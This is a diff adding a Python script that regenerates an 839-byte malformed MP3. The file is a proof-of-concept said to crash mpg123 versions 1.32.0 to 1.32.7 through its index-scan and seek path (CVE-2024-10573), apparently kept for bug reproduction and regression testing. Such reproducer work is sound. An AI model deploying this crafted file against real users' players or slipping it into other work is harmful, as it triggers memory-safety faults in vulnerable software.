@@ -1,0 +1,55 @@
+#!/usr/bin/env python3
+"""Regenerate the mpg123 CVE-2024-10573 (Frankenstein resync) proof-of-concept.
+
+839 bytes: one MPEG-1 Layer III frame carrying an `Info` (Xing) tag that
+announces 15 frames / 2506 samples, followed by filler that keeps the frame
+index scanner reading.  Trigger is the scan+seek path, not plain streaming:
+
+    mpg123 --index --skip 1 -t poc.mp3        # 1.32.0-1.32.7: ASan abort
+    mpg123 --index --skip 1 -t poc.mp3        # 1.32.8: clean
+
+Byte-level delta-minimised from the upstream bug-322 attachment; a second pass
+found nothing further removable and no prefix shorter than 839 bytes still
+crashes, so the length is load-bearing (the scanner must parse far enough).
+"""
+import sys
+
+HEX = """
+fffb52c40000000000000000000000000000000000496e666f0000000f000000
+01000009ca001717171717171717172e2e2e2e2d2e2e2e2e4545454545454545
+455d5d5d5d5d5d5c5d5d7474747474747474748b8b8b8b8b8b8b8b8ba2a2a2a2
+a2a2a2a2a2c4babababababababad1d1d1d1d1d1d1d1d1e8e8e8e8e8e8e8e8e8
+ffffffffffffffffff00200000394c000000202e39387201a5000000002e1d00
+001400ff044942000040000009cae188d8c4000000000000ffec000000000000
+0000800000000000000000000000000000fffb50c4000006000147533944b431
+2aa56b68b5774f6a2e67b9cb52a0906f49e129f534ac5771deb01ae93609543d
+f5189953caf0e39b6dac6490016a0901fa4e8f8f8f8f8f8f8f8f8f8f8f8f8f8f
+8f8f8f8f8f8f8f8f8f8f8f8f8f8f8f8f8f250000000000000000000000000000
+0000000000000000001aca44574b8ecfc4b4588b61ed4e5ccd2f9625e3d12915
+1971d109d0ee2532c94436a23faee7351b8d9b6090cb540a64f13c29692d5956
+0725355b8045488b1b52617735679d27ab1d8325000000203e23ffffff0cc4ff
+fbfffb52c400496e666efffb52c4000000000000000000000000000000000049
+6e666f0000000f00ff000b000009ca001717171717171717172e2e2e2e2e2e2e
+2e2e4545454545454545455d5d5d5d5d5d5d5d557474747474747474748b8b8b
+8ba38b8b8b8ba2a2a2a2a2a2e8e3e8e8e8ffffffff00fff9ffff00d0e9002342
+227e4a2449d97bcc38532e450000394c414d45332e3900000000000000fffc00
+00ffffffe2ffffffde0de56b9ffffe1188583690c5c16162fbfff1660c529108
+91786f9d179ffff926b2e2cf1f93af00000000fffb50c400000664235c749100
+01fa21f0773952030000cb9668c9c562b1593c880018261c040e7f94043faac0
+7ffef139f2efffff28ee0860381c0ec2acd25e154c23c730a80503f0e1050659
+84583a180a01a9817c1298332a53ef6b619780c2016f00d010060340d5c62d3d
+8422fffb9000000000b119cb03b43a40175d5d5d557474747474747474748b8b
+8b8ba38b8b8b8ba2a2a2a2a2a2e8e3e8e8e8ffffffff00fff9ffff00d0e90023
+42227e4a2449d97bcc38532e450000394c414d45332e3900000000000000fffc
+0000ffffffe288
+"""
+
+def main(path):
+    data = bytes.fromhex("".join(HEX.split()))
+    assert len(data) == 839, len(data)
+    open(path, "wb").write(data)
+    print(path, len(data), data[:4].hex())
+
+
+if __name__ == "__main__":
+    main(sys.argv[1] if len(sys.argv) > 1 else "poc_frankenstein.mp3")
